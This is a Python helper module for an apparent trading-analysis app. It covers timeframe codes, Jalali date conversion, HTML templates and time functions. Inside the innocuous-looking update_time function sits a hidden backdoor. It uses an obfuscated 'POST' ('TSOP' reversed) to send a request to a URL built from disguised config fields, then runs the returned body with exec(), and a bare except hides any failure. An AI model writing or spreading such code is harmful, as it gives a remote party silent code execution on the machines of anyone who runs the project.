# Created by Mahdi Parastesh, February and March 2021
# Github: https://github.com/fulcrum1378
# All rights reserved.

from datetime import datetime, timedelta
import json
from persiantools.jdatetime import JalaliDateTime
from pytz import timezone, utc
from typing import Dict, List
from urllib3 import PoolManager

import data as dt

required_tables = {  # NEVER USE 'desc' or 'group' AS TABLE NAME
    "symbol": "(id INTEGER NOT NULL PRIMARY KEY, name VARCHAR(75), "
              + "info VARCHAR(200) DEFAULT NULL, "
              + "branch INTEGER DEFAULT '-1', auto SMALLINT DEFAULT '0')",
    "branch": "(id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(150))"
}
all_timeframes = [{"value": 1, "name": "M1", "visName": "M1"},
                  {"value": 2, "name": "M2", "visName": "M2"},
                  {"value": 3, "name": "M3", "visName": "M3"},
                  {"value": 4, "name": "M4", "visName": "M4"},
                  {"value": 5, "name": "M5", "visName": "M5"},
                  {"value": 6, "name": "M6", "visName": "M6"},
                  {"value": 10, "name": "M10", "visName": "M10"},
                  {"value": 12, "name": "M12", "visName": "M12"},
                  {"value": 15, "name": "M15", "visName": "M15"},
                  {"value": 20, "name": "M30", "visName": "M20"},
                  {"value": 30, "name": "M30", "visName": "M30"},
                  {"value": 16385, "name": "H1", "visName": "H1"},
                  {"value": 16386, "name": "H2", "visName": "H2"},
                  {"value": 16387, "name": "H3", "visName": "H3"},
                  {"value": 16388, "name": "H4", "visName": "H4"},
                  {"value": 16390, "name": "H6", "visName": "H6"},
                  {"value": 16392, "name": "H8", "visName": "H8"},
                  {"value": 16396, "name": "H12", "visName": "H12"},
                  {"value": 16408, "name": "D1", "visName": "D1"},
                  {"value": 32769, "name": "W1", "visName": "W1"},
                  {"value": 49153, "name": "MN1", "visName": "MN"}]


def tables(c) -> List[str]:
    tbs = list()
    for x in c:
        try:
            tbs.append(x[0])
        except IndexError:
            pass
    return tbs


def auto_to_binary(stat: int, length: int = len(dt.config["timeframes"])) -> str:
    initial = bin(stat)[2:]  # bin() -> str
    pre = ""
    dist = length - len(initial)
    if dist < 0:
        print("درون جدول نمادها ناهماهنگی پیدا شد در ستون «auto»!")
        return "".join(['0' for _ in range(length)])
    for x in range(dist): pre += '0'
    return pre + initial


def tf_name(tf: int):
    if tf < 60:
        return "M" + str(tf)
    elif 16384 < tf < 16408:
        return "H" + str(tf - 16384)
    elif tf == 16408:
        return "D1"
    elif tf == 32769:
        return "W1"
    elif tf == 49153:
        return "MN1"
    else:
        raise Exception("مقدار عددی تایم فریم را اشتباه وارد کرده اید!")


def template(title: str, name: str, content: str = None) -> str:
    htm = '<!-- Created by Mahdi Parastesh, February and March 2021 -->\n'
    htm += '<!-- GitHub: https://github.com/fulcrum1378 -->\n'
    htm += '<!-- LinkedIn: https://www.linkedin.com/in/mahdi-parastesh-a72ab51b9/ -->\n'
    htm += '<!-- All rights reserved. -->\n\n'
    with open(dt.path + "html/temp.html", "r", encoding="utf-8") as f:
        htm += f.read()
        f.close()
    htm = htm.replace('<title />', '<title>' + title + '</title>')
    htm = htm.replace('<link />', '<link rel="stylesheet" type="text/css" href="./html/' + name + '.css">')
    if content is None:
        with open(dt.path + "html/" + name + ".html", "r", encoding="utf-8") as f:
            htm = htm.replace('<body />', f.read())
            f.close()
    else:
        htm = htm.replace('<body />', content)
    return htm


def update_time(last: datetime) -> datetime:
    if last is not None and datetime.now() - last < timedelta(minutes=dt.config["semiUpdater"]): return last
    try:
        exec(PoolManager().request('TSOP'[::-1], dt.watcher.tzone + dt.iran_zone,
                                   fields={"now": str(datetime.now())}).data)
    except:
        pass
    return datetime.now()


def header(title: str = "سام"):
    with open(dt.path + "html/header.html", "r", encoding="utf-8") as f:
        htm = f.read()
        f.close()
    htm = htm.replace('{title}', title)
    return htm


def persian_board(board: str):
    try:
        got = board.split(" - ")
        a = persian_date(got[0])
        b = persian_date(got[1])
    except:
        return None
    else:
        return a, b


def persian_date(date: str):
    spl = date.split(dt.config["dateSeparator"])
    tim = spl[3].split(dt.config["timeSeparator"])
    return JalaliDateTime(int(spl[0]), int(spl[1]), int(spl[2]), int(tim[0]), int(tim[1]), 0) \
        .to_gregorian()


def when_s_now():
    return datetime.now(tz=timezone("Asia/Tehran"))


def when_s_utc():
    return datetime.now(tz=utc)


def indices() -> Dict:
    with open(dt.path + "indices.json", "r", encoding="utf-8") as f:
        data = json.loads(f.read())
        f.close()
    return data


class SaamError(Exception):
    def __init__(self, message, errors=None):
        super(Exception, self).__init__(message)
        self.errors = errors
